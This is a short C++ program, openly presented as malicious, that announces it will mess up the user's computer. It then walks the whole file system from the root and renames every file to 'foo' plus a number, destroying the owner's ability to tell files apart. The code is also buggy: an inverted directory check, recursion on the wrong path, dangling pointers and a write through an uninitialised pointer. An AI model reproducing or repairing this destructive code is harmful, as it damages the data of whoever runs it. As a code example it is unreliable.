#include <stdio.h>
#include <vector>
#include <dirent.h>
#include <string>
#include <cstring>

#ifdef WIN32
#define PATH_SEPARATOR '\\'
#define ROOT "C:\\"
#else
#define PATH_SEPARATOR '/'
#define ROOT "/"
#endif

int getFiles(const char* root, std::vector<const char*>& files){
    DIR* dir;
    struct dirent* entry;

    if(!(dir = opendir(root)) || !(entry = readdir(dir)))
        return 1;

    do{
        if(strcmp(entry->d_name,".")==0||strcmp(entry->d_name,"..")) continue;

        char path[1024];
        int len = snprintf(path,sizeof(path)-1,"%s/%s",root,entry->d_name);
        path[len] = 0;
        if(entry->d_type == DT_DIR){
            getFiles(root,files);
        }else{
            files.push_back(path);
        }
    }while(entry = readdir(dir));
    closedir(dir);

    return 0;
}

int main(int argc, char const *argv[])
{
    printf("Hello, today I will be fucking up your computer.");

    std::vector<const char*> files;

    if(getFiles(ROOT,files)) return 1;

    for(int i=0;i<files.size();i++){
        std::string name = files.at(i);
        std::string foo = name;

        int l = name.find_last_of(PATH_SEPARATOR);
        int l2 = name.find_last_of('.');

        foo.replace(l,(l2-l),"foo%d");

        char* str;
        sprintf(str,foo.c_str(),i);
        rename(name.c_str(),str);
    }

    printf("Replaced all of your filenames with foo.");
    printf("Good luck trying to figure out what is what!");

    return 0;
}
